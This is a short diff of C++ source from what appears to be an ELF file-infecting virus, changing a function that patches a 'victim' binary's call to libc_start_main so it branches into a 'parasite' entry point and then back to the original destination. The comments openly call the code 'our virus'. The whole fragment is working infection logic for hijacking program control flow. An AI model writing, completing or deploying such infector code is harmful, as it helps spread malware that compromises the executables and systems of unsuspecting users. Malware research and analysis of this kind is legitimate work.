@@ -55,18 +55,14 @@ bool LibcStartMainPatcher::operator()(
         auto original_destination =
             branch_destination(&victim[host_patch_offset], vaddr_for_bl);
 
-        // patch bl instruction to branch to virus.
-        // defect: on x86-64, the original instruction might be longer than
-        // what's being patched, which results in an illegal instruction at the
-        // end. The next instruction is hlt so it doesn't really matter that
-        // much.
-        patch_branch_with_return(&victim[host_patch_offset], vaddr_for_bl,
+        // unconditionally branch from the original function call to our virus.
+        patch_branch(&victim[host_patch_offset], vaddr_for_bl,
                                  parasite_entry_address);
 
-        vt::printf("original destination %x\n", original_destination);
-
-        // patch the virus to jump back to original branch's destination
-        patch_branch(
+        // patch the virus to jump back to original branch's destination.
+        // Since the original code calls (branch-link/call) the function,
+        // we also branch with return it here.
+        patch_branch_with_return(
             &victim[parasite_file_offset + patch_offset_from_parasite_start],
             parasite_entry_address + patch_offset_from_parasite_start,
             original_destination);
